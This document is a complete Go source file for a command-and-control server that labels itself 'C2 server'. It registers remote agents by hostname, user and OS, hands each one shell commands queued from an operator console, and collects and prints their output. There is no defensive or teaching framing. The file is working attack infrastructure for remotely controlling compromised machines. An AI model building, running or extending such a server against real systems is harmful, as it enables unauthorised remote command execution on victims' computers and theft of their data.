package main

import (
	"bufio"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

const listenAddr = ":8080"

type Task struct {
	ID   int    `json:"id"`
	Cmd  string `json:"cmd"`
	Sent bool   `json:"-"`
}

type Result struct {
	TaskID  int       `json:"task_id"`
	Output  string    `json:"output"`
	Success bool      `json:"success"`
	At      time.Time `json:"-"`
	Seen    bool      `json:"-"`
}

type Agent struct {
	ID       string
	Hostname string
	User     string
	OS       string
	LastSeen time.Time
	Pending  []Task
	Results  []Result
}

type registerReq struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	User     string `json:"user"`
	OS       string `json:"os"`
}

type resultReq struct {
	AgentID string `json:"agent_id"`
	TaskID  int    `json:"task_id"`
	Output  string `json:"output"`
	Success bool   `json:"success"`
}

var (
	mu     sync.Mutex
	agents = map[string]*Agent{}
	taskID int
)

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("POST /api/register", handleRegister)
	mux.HandleFunc("GET /api/tasks", handleTasks)
	mux.HandleFunc("POST /api/results", handleResults)

	go resultPrinter()
	go console()

	log.Printf("[*] C2 server listening on %s", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, mux))
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	var req registerReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}
	if req.Hostname == "" {
		req.Hostname = "unknown"
	}

	mu.Lock()
	id := req.ID
	if id == "" || agents[id] != nil {
		id = randomID()
	}
	agents[id] = &Agent{
		ID:       id,
		Hostname: req.Hostname,
		User:     req.User,
		OS:       req.OS,
		LastSeen: time.Now(),
	}
	mu.Unlock()

	log.Printf("[+] agent registered: %s (%s\\%s, %s)", id, req.Hostname, req.User, req.OS)
	json.NewEncoder(w).Encode(map[string]string{"id": id})
}

func handleTasks(w http.ResponseWriter, r *http.Request) {
	id := r.URL.Query().Get("id")

	mu.Lock()
	defer mu.Unlock()
	a := agents[id]
	if a == nil {
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}
	a.LastSeen = time.Now()
	for i := range a.Pending {
		if !a.Pending[i].Sent {
			a.Pending[i].Sent = true
			json.NewEncoder(w).Encode(a.Pending[i])
			return
		}
	}
	w.WriteHeader(http.StatusNoContent)
}

func handleResults(w http.ResponseWriter, r *http.Request) {
	var req resultReq
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	mu.Lock()
	a := agents[req.AgentID]
	if a == nil {
		mu.Unlock()
		http.Error(w, "unknown agent", http.StatusNotFound)
		return
	}
	a.LastSeen = time.Now()
	a.Results = append(a.Results, Result{
		TaskID:  req.TaskID,
		Output:  req.Output,
		Success: req.Success,
		At:      time.Now(),
	})
	mu.Unlock()

	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// --- operator console ---

func console() {
	sc := bufio.NewScanner(os.Stdin)
	printHelp()
	for {
		fmt.Print("\nc2> ")
		if !sc.Scan() {
			return // stdin closed (e.g. server started without a console)
		}
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		switch {
		case line == "help":
			printHelp()
		case line == "list":
			listAgents()
		case strings.HasPrefix(line, "task "):
			parts := strings.SplitN(line, " ", 3)
			if len(parts) < 3 {
				fmt.Println("usage: task <agentID> <command>")
			} else {
				queueTask(parts[1], parts[2])
			}
		case strings.HasPrefix(line, "results "):
			showResults(strings.Fields(line)[1])
		case line == "quit":
			fmt.Println("bye")
			os.Exit(0)
		default:
			fmt.Println("unknown command, try 'help'")
		}
	}
}

func printHelp() {
	fmt.Println(`commands:
  list                    show registered agents
  task <agentID> <cmd>    queue a shell command for an agent
  results <agentID>       show output received from an agent
  quit                    stop the server`)
}

func listAgents() {
	mu.Lock()
	defer mu.Unlock()
	if len(agents) == 0 {
		fmt.Println("no agents registered yet")
		return
	}
	fmt.Printf("%-10s %-18s %-14s %-8s %-10s %s\n", "ID", "HOSTNAME", "USER", "OS", "LAST SEEN", "PENDING")
	for _, a := range agents {
		fmt.Printf("%-10s %-18s %-14s %-8s %-10s %d\n",
			a.ID, cut(a.Hostname, 18), cut(a.User, 14), a.OS,
			time.Since(a.LastSeen).Round(time.Second), len(a.Pending))
	}
}

func cut(s string, n int) string {
	if len(s) > n {
		return s[:n-1] + "…"
	}
	return s
}

func queueTask(id, cmd string) {
	mu.Lock()
	defer mu.Unlock()
	a, ok := agents[id]
	if !ok {
		fmt.Println("no such agent:", id)
		return
	}
	taskID++
	a.Pending = append(a.Pending, Task{ID: taskID, Cmd: cmd})
	fmt.Printf("queued task %d for agent %s\n", taskID, id)
}

func showResults(id string) {
	mu.Lock()
	defer mu.Unlock()
	a, ok := agents[id]
	if !ok {
		fmt.Println("no such agent:", id)
		return
	}
	if len(a.Results) == 0 {
		fmt.Println("no results yet")
		return
	}
	for _, r := range a.Results {
		status := "ok"
		if !r.Success {
			status = "error"
		}
		fmt.Printf("--- task %d [%s] at %s ---\n%s\n",
			r.TaskID, status, r.At.Format("15:04:05"), r.Output)
	}
}

// resultPrinter prints task output as soon as it arrives so the operator
// does not have to run `results` manually after every command.
func resultPrinter() {
	type printLine struct {
		agentID string
		taskID  int
		success bool
		output  string
	}
	for range time.Tick(500 * time.Millisecond) {
		var ready []printLine
		mu.Lock()
		for _, a := range agents {
			for i := range a.Results {
				if !a.Results[i].Seen {
					a.Results[i].Seen = true
					ready = append(ready, printLine{a.ID, a.Results[i].TaskID, a.Results[i].Success, a.Results[i].Output})
				}
			}
		}
		mu.Unlock()
		for _, p := range ready {
			status := "ok"
			if !p.success {
				status = "error"
			}
			fmt.Printf("\n[result] agent %s task %d (%s):\n%s\nc2> ", p.agentID, p.taskID, status, p.output)
		}
	}
}

func randomID() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%x", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}
